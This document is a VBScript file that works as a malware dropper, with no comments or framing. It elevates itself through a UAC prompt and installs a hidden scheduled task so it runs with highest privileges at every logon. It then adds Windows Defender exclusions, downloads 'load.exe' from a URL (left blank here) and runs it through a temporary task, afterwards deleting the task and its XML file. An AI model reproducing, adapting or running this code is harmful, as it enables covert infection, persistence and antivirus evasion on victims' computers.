Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

isAdminCheck = "powershell -Command ""([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"""
Set execCheck = objShell.Exec(isAdminCheck)
isAdmin = execCheck.StdOut.ReadAll()

If InStr(isAdmin, "True") = 0 Then
    currentVBS = WScript.ScriptFullName
    elevateCommand = "powershell -Command ""Start-Process 'wscript.exe' -ArgumentList '""" & currentVBS & """' -Verb RunAs"""
    objShell.Run elevateCommand, 0, False
    WScript.Quit
End If

currentVBS = WScript.ScriptFullName

taskName = "AlwaysRunAsAdmin"
taskXMLPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\always_run_as_admin_task.xml"

If Not fso.FileExists(taskXMLPath) Then
    Set taskFile = fso.CreateTextFile(taskXMLPath, True)
    taskFile.WriteLine "<?xml version=""1.0"" encoding=""UTF-16""?>"
    taskFile.WriteLine "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">"
    taskFile.WriteLine "  <Triggers>"
    taskFile.WriteLine "    <LogonTrigger>"
    taskFile.WriteLine "      <Enabled>true</Enabled>"
    taskFile.WriteLine "    </LogonTrigger>"
    taskFile.WriteLine "  </Triggers>"
    taskFile.WriteLine "  <Principals>"
    taskFile.WriteLine "    <Principal id=""Author"">"
    taskFile.WriteLine "      <LogonType>InteractiveToken</LogonType>"
    taskFile.WriteLine "      <RunLevel>HighestAvailable</RunLevel>"
    taskFile.WriteLine "    </Principal>"
    taskFile.WriteLine "  </Principals>"
    taskFile.WriteLine "  <Settings>"
    taskFile.WriteLine "    <AllowStartIfOnBatteries>true</AllowStartIfOnBatteries>"
    taskFile.WriteLine "    <DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries>"
    taskFile.WriteLine "    <StartWhenAvailable>true</StartWhenAvailable>"
    taskFile.WriteLine "    <RunOnlyIfIdle>false</RunOnlyIfIdle>"
    taskFile.WriteLine "    <AllowHardTerminate>true</AllowHardTerminate>"
    taskFile.WriteLine "    <Hidden>true</Hidden>"
    taskFile.WriteLine "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
    taskFile.WriteLine "  </Settings>"
    taskFile.WriteLine "  <Actions Context=""Author"">"
    taskFile.WriteLine "    <Exec>"
    taskFile.WriteLine "      <Command>wscript.exe</Command>"
    taskFile.WriteLine "      <Arguments>" & currentVBS & "</Arguments>"
    taskFile.WriteLine "    </Exec>"
    taskFile.WriteLine "  </Actions>"
    taskFile.WriteLine "</Task>"
    taskFile.Close

    createTaskCommand = "schtasks /create /tn " & taskName & " /xml " & taskXMLPath & " /f"
    objShell.Run createTaskCommand, 0, True

    runTaskCommand = "schtasks /run /tn " & taskName
    objShell.Run runTaskCommand, 0, True

    WScript.Quit
End If

If fso.FileExists(taskXMLPath) Then
    fso.DeleteFile(taskXMLPath)
End If

url = ""
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"

downloadCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
objShell.Run downloadCommand, 0, True

addExclusionCommand = "powershell -Command ""Add-MpPreference -ExclusionPath '" & savePath & "'; Add-MpPreference -ExclusionPath '" & currentVBS & "'"""
objShell.Run addExclusionCommand, 0, True

taskXMLPath = tempFolder & "\task.xml"

Set taskFile = fso.CreateTextFile(taskXMLPath, True)
taskFile.WriteLine "<?xml version=""1.0"" encoding=""UTF-16""?>"
taskFile.WriteLine "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">"
taskFile.WriteLine "  <Triggers>"
taskFile.WriteLine "    <LogonTrigger>"
taskFile.WriteLine "      <Enabled>true</Enabled>"
taskFile.WriteLine "    </LogonTrigger>"
taskFile.WriteLine "  </Triggers>"
taskFile.WriteLine "  <Principals>"
taskFile.WriteLine "    <Principal id=""Author"">"
taskFile.WriteLine "      <LogonType>InteractiveToken</LogonType>"
taskFile.WriteLine "      <RunLevel>HighestAvailable</RunLevel>"
taskFile.WriteLine "    </Principal>"
taskFile.WriteLine "  </Principals>"
taskFile.WriteLine "  <Settings>"
taskFile.WriteLine "    <AllowStartIfOnBatteries>true</AllowStartIfOnBatteries>"
taskFile.WriteLine "    <DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries>"
taskFile.WriteLine "    <StartWhenAvailable>true</StartWhenAvailable>"
taskFile.WriteLine "    <RunOnlyIfIdle>false</RunOnlyIfIdle>"
taskFile.WriteLine "    <AllowHardTerminate>true</AllowHardTerminate>"
taskFile.WriteLine "    <Hidden>false</Hidden>"
taskFile.WriteLine "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
taskFile.WriteLine "  </Settings>"
taskFile.WriteLine "  <Actions Context=""Author"">"
taskFile.WriteLine "    <Exec>"
taskFile.WriteLine "      <Command>" & savePath & "</Command>"
taskFile.WriteLine "    </Exec>"
taskFile.WriteLine "  </Actions>"
taskFile.WriteLine "</Task>"
taskFile.Close

taskName = "TempTask_RunAsAdmin"

createTaskCommand = "schtasks /create /tn " & taskName & " /xml " & taskXMLPath & " /f"
objShell.Run createTaskCommand, 0, True

runTaskCommand = "schtasks /run /tn " & taskName
objShell.Run runTaskCommand, 0, True

deleteTaskCommand = "schtasks /delete /tn " & taskName & " /f"
objShell.Run deleteTaskCommand, 0, True

fso.DeleteFile taskXMLPath, True
